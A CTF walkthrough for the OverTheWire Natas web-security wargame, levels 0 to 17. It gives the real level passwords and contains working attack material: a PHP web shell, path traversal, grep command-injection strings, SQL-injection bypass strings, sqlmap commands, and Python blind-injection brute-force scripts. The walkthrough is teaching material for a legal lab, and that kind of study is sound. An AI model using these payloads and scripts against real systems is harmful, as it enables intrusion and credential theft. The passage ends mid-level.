# Natas
Welcome to the 3rd challenge of the WarGames series from OverTheWire.
In this CTF we are gonna learn the basics of server-side web-security.
Here is the link to view the challenge from their website : https://overthewire.org/wargames/natas/

To complete this challenge is suggested you to have at least a basic knowledge on how websites works behind the scenes (http request, headers, cookies...), basic web-development languages knowledge to understand some simple code and some common Linux commands syntax, also a familiarity with some tools for web-pentesting will help but is not strictly required.

To access every level you will only need a web browser of your choice, we will open the link and proceed; the link is http://natas0.natas.labs.overthewire.org , we will need to change the number after "natas" to match the level we want to access.

Once we have modified the link copy and paste it in the URL bar of the browser, since it is using the HTTP protocol a warning might appear telling that the connection is not secure, ignore it and view the website.

Finally to successfully view the page we will need to insert a username and password : <br>
username : natas0 (change the number to match the level) <br>
password : this is what we need to find to log in every level  <br> 

Remember that there are multiple ways to solve most of the levels, so if one doesn't work for you or you don't like it go with another one, you can also be creative and find a method that suits with your style.
I will provide, whenever possible, multiple ways to solve the challenges, both a simple one and a more complex but comprehensive other.

Ok, everything is set, let's begin

<br/>

### Level 0
Access the website with the link : http://natas0.natas.labs.overthewire.org . <br>
Insert the credentials : <br>
username : natas0 <br>
password : natas0 <br>

We see a page with written that we will find the password for the next level in this page.
If look in the page we can see there is only that sentence and the background, a good way to start to analyze a web-page and discover more info about it is to view its source code.

To view a "page source" right click with the mouse on the page and select "view page source", another tab will open in the browser showing us the code behind the page.

Viewing the code we can see there are 2 comments, highlighted in green, and thee second one contains exactly what we are looking for, the password for level 1, which is : g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
<br/>

---

### Level 0 -> 1
Access the website with the link : http://natas1.natas.labs.overthewire.org .  <br>
Insert the credentials : <br>
username : natas1  <br>
password : g9D9cREhslqBKtcA2uocGHPfMZVzeFK6  <br>

Once we log-in we can read that this time the right click has been blocked, meaning that probably the password is again in the home page source but we need to find another way to view it.

There are some ways around here, i will explain 2 easy and quick ones:
+ The first one is to open the developer tools in your web browser, to do it click the option menu in the top right of the browser, chose more tools, than developer tools, once you have it open you can see the page elements, extend the different forms and here we have the password as a comment like in the last level.

- Another way is to run a script blocker extension in your browser, since they deactivated the right click with JavaScript if we block the code from executing we will see the page with the right click enabled, than we can proceed as in level0.

Whether you have chosen method 1 or 2 you will be able to see the password for level2 : h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7

**Extra Mile**
If you have time or wanna practice with some pentesting tools you can even get the password by using burp suite, even tho in this case is preatty inconvenient as it is way longer.
You will need to use the proxy module to capture the initial request to the page, send it to repeater, send the request and than you will be able to see the response showing the full page source.
<br>

---

### Level 1 -> 2
Access the website with the link : http://natas2.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas1  <br>
password : h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7  <br>

This time we get an hint telling us that there is nothing in this page, anyway we want always to check the page source for extra info.

When we see the page source we can notice that there is a call for an image, if we click on the link we see a very small white square.... not usefull.
Looking again in the source code we see that the image is in a directory called "files", maybe we can go inside of it and see if there are any usefull ones, to do it add "/files" in the URL.

Here near the image file there is a text file called "users.txt", we can open it by clicking on it and we can see a list of usernames and passwords, and luckly enough there is also the oune for natas3 : G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
<br/>

---

### Level 2 -> 3
Access the website with the link : http://natas3.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas3  <br>
password : G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q  <br>

Let's view again the page source, but this time we see a comment in the code saying that there are no more information leaks, this means that we have to find a new way to discover the password.

The sentence also tells us another curious thing, that even Google wont be able to find it.... ; 
So a little bit of theory : when you create a website and you post it online Google will crwal and index all the pages of your website, so the people will be able to search for each and the content inside of it. But what if you don't want a search engine to index one of more pages? You create a file called "robots.txt" and all the pages inside this text files will be automatically ignored and not indexed.

Knowing this we can change the url by adding /robots.txt and see if that's the case.
Looks like there is a page that has been hidden, with the name of "/s3cr3t/", let's visit it by adding that to the end of the URL (remember to remove /robots.txt firs); we can see a page source and a call for a document which name is "users.txt", we can double click on it to open the link.

And a new page open with the password for natas4 : tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
<br/>

---

### Level 3 -> 4
Access the website with the link : http://natas4.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas4 <br>
password : tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm <br>

This time, as we can read when we open the website, in order to view the password we need to appear as if we connected to this site coming from http://natas5.natas.labs.overthewire.org/ .

When you visit a website you automatically send a request with many HTTP headers that serve the purpose of giving you the content you want for the platform you are using, in our case the header we are interested in is called *Referer*, it is used to tell a website from which website we are coming from (if any).

In this case we want to manipulate that value to make it looks like we are coming from the level5 website.

Again there are different ways, this time i will explain the Burp Suite one and later give an hint for an easier method.

So open Burp Suite, go in the proxy section and start up the built in browser, visit  again the current level website and log in;
Now back into the proxy section, enable the proxy by clicking on "intercept" and make it turn 4575DB, go back to the browser and reload the page.
Doing this you will receive the HTTP request, right click and tap on "send to repeater", here we will add the header to forge a new request making us looks like we are coming from natas5.

In the raw code, after the user agent part, add a new line with this :
```
Referer: http://natas5.natas.labs.overthewire.org/
```

Now the request is ready, click on "send" and we will receive the response.

The response is like the page source we have analyzed before, scroll down ad you will find the password : Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

**Easier Method**
After completing the challenge i have noticed that some browsers offer an extension to change the referrer, downloading it will proably make the whole process faster as, once in the website page you can open your extension and type in the referrer of your choice.
Remember to vet the extensions before installing them ;).
<br/>

---

### Level 4 -> 5
Access the website with the link : http://natas5.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas5 <br>
password : Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD <br>

When the sites open we get the message "Access disallowed. You are not logged in"...

In the website where you can login there are the "session cookies" these are used, as we can imagine, to sign the session, and they will change value once you log in and establish your own session in the site.

Let's check if it is the case, we can open the "developer tools" from the option menu of the browser, than on the top navigate to "Application" and now on the left panel choose cookies, you should see the URL of the natas page, click on it.

Now we can see which cookies are active here and their value, here we can see a cookie called "loggedin" with the value of 0.

Normally cookies, expecially session ones, will have a very long and complicated value to avoid the risk of session hijacking, here since the value is only "0" and we got the error message before, we can guess that "0" is for session closed and "1" for session established.

With this knowledge we can now change the cookie's value, tap on the "0", right click and chose "edit value", make it "1".

At this poin we need to refresh the webpage, re-insert our credential of the level and we will have the password for natas6 displayed : fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
br/>

---

### Level 5 -> 6
Access the website with the link : http://natas6.natas.labs.overthewire.org .  <br>
Insert the credentials : <br> 
username : natas6 <br>
password : fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR <br>

This time we can see there is a box where we have to submit a secret code, there is also an option to check the source code, let's view it.

The script is preatty simple, it will check if the secret we submit is the same as the one it has in memory, if so it will print the password for natas7.

The problem is that we don't know the secret code...yet. In fact if we look again at the code we can see that it includes a file, we can imagine that in that file is stored the secret code where the script will look for the match.
We can try to see if we can reach it with our browser, add at the end of the URL "/includes/secret.inc", luckly enought we get a page with the value of secret : FOEIUWGHFEEUHOFUOIU .

At this point we can copy and submit it going back into the main page, and like magic we get the password for the next level : jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
br/>

---

### Natas 7
Access the website with the link : http://natas7.natas.labs.overthewire.org .  <br>
Insert the credentials : <br>
username : natas7 <br>
password : jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr  <br>

he home page seems showing nothing much, let's view the page sourve and we can notice a comment wit an hint  that says our password for level 8 is located in /etc/natas_webpass/natas8 .

In order to reach that directory we can use a tecnique called directory traversal, in a few word it consists in evading the normal path to reach a file, allowing us to see other files and directories that we should not normally see.

This is usually achieved by exploiting a php function, usually a legitimate one that calls for a file, we can than manipulate it to get another file (the one hidden that we want). 

To do it i have noticed that when we click in the home page to one of the links (home or about), the URL changes and it add a php funcion calling for the files that contains the home or about page. 

Knowing this i edited the url :

1. Remove the last word (about or home depending on which link you have clicked on)
2. We want to escape the current directory and go back to the root one, so we can than move to the one containing the password, so i crafted this part that we want to add after the `=` simbol :
`../../../../etc/natas_webpass/natas8`

3. Now press `ENTER` and the password will be displayed on your screen : a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
<br/>

---

### Natas 8
Access the website with the link : http://natas8.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas8 <br>
password : a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB  <br>

This time we have again a form where we have to insert a secret code, let's click on the "view source code" link to understeand what is going on behind the scene,

The script will encode a secret and if it finds a match it will provide us with the pasword we are looking for.
We can also notice in the first line that there is the value of the encoded secret already written in the code, what we have to do is to decode it, find the original secret and submit it.

The secret, as we can see in the script, has been encoded multiple times, so in order to decode it we have to go trough some passages in reverse order from the script :
(You can find plenty of tools online for this actions, chose the one you prefer, you can even create your own script to do all the job if you like)

Encoded secret = 3d3d516343746d4d6d6c315669563362
1. Decode bin2hex
	we will get this : `==QcCtmMml1ViV3b`

2. Reverse it
	and we get this : `b3ViV1lmMmtCcQ==`

3. Decode the base64 string
	And we finally get the secret: oubWYf2kBq

Now insert that code in the form, press submit and you will see the password for natas9 : Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

**The Hard Way**
We have jsut seen how to decode the initial encoded secred by using multiple different tools online, BUT there is another way to do it, create your own script to automate the process.
Since the first script was made in PHP i have created another PHP script that does the decoding, i have written it line per line so everyone will be able to view all the steps that the script does, like the ones we did before.
I think seeing this will might help you getting started viewing some programming languages and how they work, if you already know the foundamentals and wanna push trough i suggest you to create your own script and then maybe optimize it.
```php
<?php


$hex = "3d3d516343746d4d6d6c315669563362";

$bin = hex2bin($hex);

$reverse = strrev($bin);

$secret = base64_decode($reverse);

print ($secret);


?>
```

Than save the file as .php and to get the result run : 
```zsh
php script.php
```
<br/>

---

### Natas 9
Access the website with the link : http://natas9.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas9 <br>
password : Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd <br>

There is again a form, where we have to insert a word/string to search, checking the code we can see that it will search for that value with `grep` inside a document called "dictionary.txt".

Once more there are several ways to find the solution.
One is to escape the function abusing the grep binary and knowing how it works, let's break it down :

In the sourcecode we see this part
```zsh
grep -i $key dictionary.txt
```
What is does is using the grep binary to search into the txt file the word we have submitted, BUT what if i tell you that we can change how it works just by submitting a couble of right words and simbols?

Now clearly looking at the code we can do nothing about the `grep -i` part, but what if, at the place of the variable, we were able to tell grep to print something else in another document in another directory, maybe the one that we know is holding the password for the next level.

We can achieve this by submitting
```zsh
"" /etc/natas_webpass/natas10 
```
Doing this we are telling `grep` to give us all the content of either the natas10 file and the dictionary file.
The first line displayed will show us the password : D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

Note: there are other combinations of words-caracthers you can use, like `;` and than `cat` command, using one or another will vary slighty the output but you should be able to see the password strings anyway.
<br/>

---

### Natas 10
Access the website with the link : http://natas10.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas10  <br>
password : D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE <br>

We can see again a form where we can search for words, but this time it tells us that a filter for certain characters has been added for security reasons.

Viewing the source code we can check which characters are forbidden so we can better understeand how to move
```javascript
if(preg_match('/[;|&]/',$key)) {  
        print "Input contains an illegal character!";
```

If you have followed my previous task vrite up you will notice that the same strategy used before will work here as well without any differences, even though there is a filter this time, this is because the double quote `""` i decided to use even before will kinda close the filtering function, allowing again the other special characters.

So, as we know what is the location for the level 11 passowrd we can write the path there, so the `grep` function will display us the file content
```
"" /etc/natas_webpass/natas11
```

The first line displayed will show us the password:
<br/>

---

### Natas 11
Access the website with the link : http://natas11.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas11  <br>
password : 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg  <br>

In this level we can see another form, where we can insert a color hex value to change the background, there is also a sentence that informs us that cookies are protected with XOR encryption.

Let's begin by reading the source code behind this functions
```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

```

This time the code is a bit more complex so let's break it down to understeand what exactly is happening and how we can retrive our password.

1. At first an array containing the default "_showpassword_" and "_bgcolor_" properties is declared.
2. Than we can se 3 functions : 
	- The first one is taking care of the XOR encryption
	- The second one will work to load the data
	- And the last one will save the data
3. Finally there is a check and if the `bgcolor` key exist and matchs the characters listed, it will update the `$data` with the value from the `$_REQUEST` and at the end it calls tht savadata function with `$data` to save it in an encoded cookie.

Without going too much into details and making this long, we can see that in the first declared array the showpassword value is set to "no", as we can imagine we want a work to change that value somehow into a "yes".

More specifically we want to create a new valid cookie, which once is decoded will contain the same array as the one we have analyzed but with the "yes" value.

Now we firstly have to understeand how the XOR encryption works:
Aftere a brief research online i understood that this encryption is a type of cipher called additive, meaning that operates on this on this principles:
```
A ⊕ 0 = A
A ⊕ A = 0
A ⊕ B = B ⊕ A
(A ⊕ B) ⊕ C = A ⊕ (B ⊕ C)
(B ⊕ A) ⊕ A = B ⊕ 0 = B
```
Where `⊕` is the *exclusive disjunction* operation... basically as we can see a kind of subtraction.
So to decrypt the ouput we can symply reapply the XOR function with the key.

In our scenario we need the encrypted text, the key and with this 2 using the XOR function we can view the original plain text. But there is one problem the key value is censored.

Luckly enough applying the XOR method we can retreive the key knowing `ciphertext XOR plaintext = key` .

We can start the process by viewing the cookie value in our browser, to do it open the dev tools, go under storage and than cookies, here you can see the value:
MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY3D --> the final `%3D` is the encoded value of `=`. --> MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=
So we now know that this strig contains the `showpassword="no"` and we want a yes.

Now we can create a script to make a cookie that is not XOR encrypted so we can than use this and the encrypted ones to get the key.
```php
<?php

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

echo base64_encode(json_encode($defaultdata));

?>
```
You can execute this on a php sandbox website online and you will get this value: eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=

Now is time to get out key
For this step you can either craft another script or go on a website like https://cyberchef.org/ , here you want to chose the receipe "from base 64" and than "XOR", as key put the non-encrypted cookie and set the type as base 64; now input the encrypted cookie and you will get the key `KNHL`

We are almost there, let's now craft the new cookie
Still in cyberchef, now chose first the XOR receipe and than "to base 64", here we want to put the key and set it  as UTF-8 type with the standart scheme; in the input put wat we want to change so: `{"showpassword":"yes","bgcolor":"#ffffff"}`.

In my case this is the new cookie i got: MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz

Now that we have our new cookie go back into your browser in the natas11 page, open dev tools, edit the previous cookie with the new one and press enter, than in the for click the set color botton and the password for natas12 will be displayed on screen: 
<br/>

---

### Natas 12
Access the website with the link : http://natas12.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas12  <br>
password : YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG  <br>

When opening the website we can notice that there is a form where we can chose and than upload a file.
We can click on "View source code" to better understeand what is happening behind this form.

There is a php script where we can see that only files under 1000 are accepted, also when we upload a file the name of the upload will be changed  with a random string that ends with `.jpg`.

What we want to do is to initiate a web shell so we can than execute commands and retreive our password for level 13.
One way is to create a simple php web shell like this one
```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```
Than we can save it as web_shell.php on our device, but remember that the name is not important rn as it will be changed anyway by the script.

We can then select our file, but we want to inject ourselves in the middle of the request and change the name that has been given, we want to remove the `.jpg` and rename it as `.php`.
There are 2 main ways to do it:
1. Intercept the request when choosing the file with burp suite, send it to repeater and before sending the request to the server, find and rename the extension.
2. Use dev tools on any browsers:
	- Choose the file
	- Open dev tools and under the elements tab locate the `.jpg` extension,
	- Click on it and choose "edit as html"
	- Change to `.php`

Ok now we are ready to click upload and we can see that our file has been uploaded with the right extension, click on it.

Now we get an index notice, is fine just add `?e=ls` at the end of the url and it will show us some files that has been uploaded.
This means that we succesfully managed to execute code on the server, now is time go haunt for the password.

We already know from the previous levels that the passwords are all located in the same directory called: natas_webpass
So let's edit the URL again, remove the code that we added before and replace it with this one 
```
?e=cat%20/etc/natas_webpass/natas13
```

Press `ENTER` and the password will be displayed on the screen : lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
<br/>

---

### Natas 13
Access the website with the link : http://natas13.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas13  <br>
password : lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9 <br>

Once again we have a web-form where we can submit a file, this time it tells us that it is only accepting JPEG files for security reasons.
The file size also has to be of max 1KB.
The script function similar to the one in the previous level, renaming our upload with a random string and changing its extension to `.jpg` . 

Let's start by creating a php script that will give us a shell, as on level 12
```
nano shell.php
```
paste inside this and save:
```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```

Let's verify if it actually filter for images, we can chose our shell file created in the previous level and implement the same method...ok this time is actually different, in fact we get the message "File is not an image", we need to find a way around.

At this point i firstly went for the easiest try, uploading the shell file with a double extension like this: `shell.php.jpg` but the site understood that the file was still not an image.

Now i know that there is for sure:
- File size filtering;
- File extension filtering;
- Possibly mime type or magic number filtering, let's test this one.

I want to check if also the magic number filtering has been implemented, to do so we have to edit the first 4 couple of digits in the file hex view, those are the one used to identify a certain file type, so i want to fake it is a jpeg file ad use it's magic number.

Let's use a binary to edit the file
```bash
hexedit shell.php
```
Substitute the first block with this one: FF-D8-FF-E0 and that press `CRTL + X` to save and exit.

Now i try to upload the file and finally it accepts it, but there is a problem, the shell doesn't work; looking at the output on the screen i realized that, because we edited the magic number, we also have to modify the original script in the shell, to preserve our php.
All we have to do is add jpeg at front
```php
jpeg<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```
Now we can go back in *hexedit*, edit the first 4 bytes and upload the file.

Remember that because the website filter script is also changing our file extension we have to open devtools or use burpsuite to change it back to php as we did on level 12, than navigate to the uploaded file.

Now we are ready to get our treasure, go in the URL and add this at the end, to navigate and open the file containing the natas 14 password
```
?e=cat%20/etc/natas_webpass/natas14
```

And finally we got the password for level 14 : qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
<br/>

---

### Natas 14
Access the website with the link : http://natas14.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas14  <br>
password : qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP <br>

After logging in we notice that there is another login where we have to insert some username and password.

There is just one problem: we don't know neither the username nor the password to use.

Let's begin by viewing the source code, from what i can see the script seems checking for the credentials into a mysql database, if it finds a match for both the username and the password we will be given the password for natas15.

I have a feeling that we need to do some SQL Injection.
Well this topic is pretty long, and usually involves a lot of testing on the website, checking which errors we receive (you can use burp suite repeater for this), and than adjusting our SQL queries every time we get a new piece of information.
If you are interested in this type of attack i suggest you to do further researches to better comprehend how it works and what you can do.

Taking a different approach at the problem, in this scenario we have to perform an authentication bypass, we are not actually interested in retrieving or manipulating the database (actually might yes if is possible to inject credentials, but not the fastest way and not always possible).

The easiest way is to use common pre-made statements that will cause the query to return True both for the username and the password, in this way it will seems like we had a match in the database while we actually did not.

So, after a couple of tests inserting in both the field `'` `or1=1` `'or1=1--` i came to this one `" or1=1--`, let's break it down: the double quote is used to insert a command, the OR expression is the one that will make it return True, and finally the double dash `--` is used to comment out everything after it.

Insert that in both the field, press Login, and we have the password for natas15 : TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
<br/>

---

### Natas 15
Access the website with the link : http://natas15.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas15  <br>
password : TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB  <br>

Continuing with the exploitation of web forms, this time we have to submit an username and than check if that is present inside the database.

Looking at the source code we can notice that some lines have been commented out, is seems they wanted to create a table called users, and put inside usernames and their passwords.

So know we know that there is a table containing in one column the username and in the other the password, we also see that the maximum length of each is 64 characters.
Another good thing to notice is that we are given an error when inserting the username, so because the username and the password are in the same table we can check either if the username and a password are right.

A little piece of theory:
Because the only result we get is boolean value, either True or False, this type of SQL Injection is called Blind.

At this point there are no other hints to proceed, so i tried to insert "natas16" as username, as it is the next level of the challenge and i get the message "the user exists".
Cool now we know that very likely the password in that table is also the password for the next level, but we have to find a way to "guess" it.

Now is time to work our way to the password, i have checked the other levels and all passwords are 32 characters long, beside this we do not know any other information regarding it, as they all seems to be composed by random numbers and letters.
The idea of "guessing" it is not really possible in this scenario, but we can try to brute force it.

Now the road splits in 2, we can decide to handle ourselves the queries to the database to check for every letter correspondence, create a script in a language like python and wait for the result; or we can use a tool called *sqlmap*, it was purposely made for this type of jobs an will make the job easier.

I will start with the tool, in order to retrieve the password we have to create the command containing all the info and handling right the situation, after some tests i ended up with this one:
```bash
sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --string="This user exists" --data "username=natas16" --level=5 --risk=3 -D natas15 -T users -C username,password --dump --dbs
```
Let's break it down:
The `-u` switch is used to specify the URL we want to attack;
Than we use `--auth` switch to specify the type of HTTP authentication used to log into the level, and in the next one we provide the username and the password.
Than with `--string` we tell it to look for the message "this user exists", by doing so we know that each "injection" has successfully checked the presence of the item/value in the database;
With `--data` we specify the username that got us the success message before;
The next two switches `--level` and `--risk` are used to customize the detection phase, i put the highest level on both as is not a problem in this scenario;
The `-D` switch is used to specify the database and `-T` to set the table, finally `-C` specify which columns we are interested in.
We end the command with `--dump` meaning we want the items in the table and columns we have specified.
`--dbms=mysql` : is used to specify the database type, as we know it by looking at source code at the beginning, specifying this will make the script much much faster.
  
Now run it and wait, it should not take more than a minute with the last switch set right, if you went for your own command syntax than be aware that it can take a lots of time as it is probably doing more testing.

The binary finally show us the table, there are actually more users, for a total of four, the last one is the one of interest and in the second column we also have it's password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

**Road 2**
This way is a bit more complex and require the knowledge of a scripting language like Python as we will need to create a script that will automate the process to get the password.
First of all we have to understand how is the script checking the database and the results we get, so we can than test it and try to write the script.

When we are submitting an username this is the SQL query being sent, in this scenario i put the name "natas16":
```sql
SELECT * from users where username="" LIKE BINARY "%natas16%"
```
This query, with "natas16" will return True and hence we get the message "This user exists".

Knowing this we can create a query that will check if a word is part of the password, this is particularly useful to speed up the process, otherwise we will have to try all the letters in the alphabet for a password of 32 characters, not super convenient.

They query looks like this:
```sql
SELECT * from users where username="natas16" and password LIKE BINARY "%a%"
```
This will return again a boolean value, causing the message "This user exist" or "This user doesn't exist." if the word is not part of the password.

We can verify that this is working injecting the code in the URL like this:
```php
http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+and+password+LIKE+BINARY+%22%a%&debug
```
And we are lucky we know know the word "a" exists.

Now is time to create a script that will automate this process, listing all the letters and numbers that are in the password, and than re ordering them to form the right combination.
```python
#!/bin/python  
  
# import the libraries that we need  
import requests  
from requests.auth import HTTPBasicAuth  
  
# Save the login information in variables  
username = "natas15"  
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"  
url = "http://natas15.natas.labs.overthewire.org/index.php?debug"  
  
# Variables that will contain the possible chars and the final password  
chars_in_pswd = ''  
pswd = ''  
  
# login to natas15 challenge  
authentication = HTTPBasicAuth(username, password)  
print(requests.get(url, auth=authentication))  
  
# Saving all the possible chars in a variable for later use  
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  
  
# Loop to check the presence of each char  
for char in chars:  
    payload = {'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'}  
    req = requests.post(url, auth=authentication, data=payload)  
    if 'user exists' in req.text:  
        chars_in_pswd = chars_in_pswd + char  
  
# Print the chars that are contained in the final password  
print(chars_in_pswd)  
  
# Execute the brute-force attack  
for count in range(0,32):  
    for char in chars_in_pswd:  
        brute_force_payload = {'username': 'natas16" and password LIKE BINARY "' + pswd + char + '%" #'}  
        request = requests.post(url, auth=authentication, data=brute_force_payload)  
        if 'user exists' in request.text:  
            pswd = pswd + char  
		  print(pswd)
            break
            
# Print the final password  
print("The password for the next level of natas is: ", pswd)

```

It should take up to 5 minutes, once completed here is the password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

I encourage you to practice and create your own best version of this ;)
<br/>

---

### Natas 16
Access the website with the link : http://natas16.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas16  <br>
password : TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V  <br>

Another web form to exploit yaii, looking at the source code we can notice that this time there is a filter that will block some chars: 
```
/[;|&`\'"]/
```

One interesting new is the absence of a mySQL database, the word is checked using the `grep` Linux command inside a text file called "dictionary.txt".
This is the full command
```bash
grep -i \"$key\" dictionary.txt
```

As we did on the first levels, we want to break this grep command to make it display the password, which is contained in /etc/natas_webpass/natas17 .

Luckily for us they didn't filter out all the special chars, in fact we can still use `$()` to apply *command substitution*, rather than using `''`.
As from the GNU documentation: "Command substitution allows the output of a command to replace the command itself."

This mean that we can execute the command we want inside the parenthesis, get that output and pass it to the external `grep`.
What we aim to do is checking if some chars are in the password, similar to the previous level, but this time we do not have an printed output, we have another sign: if we check for a letter or a word that is in the dictionary file we will get those words this means that that letter is not in the password; vice versa if we get no output this mean that the word is in the password.

We can create a command like this 
```bash
$(grep a /etc/natas_webpass/natas17)cutest
```
I choose the word "cutest" because is one of the word i know are in the dictionary, this way i can test if the concept is working; you can chose the one you prefer.
Now we need to reiterate this command, if we get a response and some words appear on the screen we move to the next letter, until we get "no result", in this situation the char is part of the final password.

Again we have to repeat this for all the letters, of the alphabet both upper and lower case + the numbers from 0 to 9.
Once all this is done we have a list of all the chars part of the password, than we need to put find the right order.

As in the last level i have created a python script to automate all this long work
```python

#!/bin/python

# import the libraries that we need
import requests
from requests.auth import HTTPBasicAuth

# Save the login information in variables
username = "natas16"
password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
url = "http://natas16.natas.labs.overthewire.org/?"

req_object = {'needle': ''}

# Variables that will contain the possible chars and the final password
chars_in_pswd = ''
pswd = ''


# login to natas16 challenge
authentication = HTTPBasicAuth(username, password)
print(requests.get(url, auth=authentication))

# Saving all the possible chars in a variable for later use
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# Loop to check the presence of each char
for char in chars:
    payload = "$(grep " + char +" /etc/natas_webpass/natas17)cutest"
    req_object['needle'] = payload
    req = requests.post(url, auth=authentication, data=req_object)
    if 'cutest' not in req.text:
        chars_in_pswd = chars_in_pswd + char

# Print the chars that are contained in the final password
print("the password contains this chars: ", chars_in_pswd)

# Execute the brute-force attack
for count in range(0, 32):
    for char in chars_in_pswd:
        brute_force_payload = "$(grep ^" + pswd + char + " /etc/natas_webpass/natas17)cutest"
        req_object['needle'] = brute_force_payload
        request = requests.post(url, auth=authentication, data=req_object)
        if "cutest" not in request.text:
            pswd  += char
            print(pswd)
            break

# Print the final password
print("The password for the next level of natas is: ", pswd)


```

This time the script will take more time so be patient, you can go to take a coffie.

After a while here we have it : XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
<br/>

---

### Natas 17
Access the website with the link : http://natas17.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas17  <br>
password : XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd <br>

We are presented again a web form where we have to insert an username, checking the code it  is very similar to the one of level 15, still searching for a match in a mySQL database.
There is one difference tho, the response in case we write a correct or wrong username is commented out, this means that we get no written feedback whether we are inserting the right data or not.

On the bright side, there is another option available, using the "time" --> "response time" of our requests as an answer, based on the value that it will give us back we can simulate the True/False response we had on level 15.

We can use a query like this one to test if it works, and then test again with a wrong username
```sql
SELECT * from users where username="natas18" and sleep(5)
```

To try it write this in the username field:
```
natas18" and sleep(5) #
```
We can notice that the page took 5 seconds to load as we expected.
And if we try with other names like "natas19" the page will load instantly.

Now we know that the idea of using the response time as a clue is right.

As in level 15 we have 2 ways to proceed:
A little thing: if your connection is slow or congested it will make the results not correct and you might need to run both of the methods multiple times. If you still get bad results try to increase the sleep time to avoid false positives and do not do any other internet related things in the meantime.

**Method 1**
Use *sqlmap*
```bash
sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?" --time-sec=1 --auth-type=Basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd  --data "username=natas18" --level=5 --risk=3 -D natas17 -T users -C username,password --dump --dbms=mysql
```
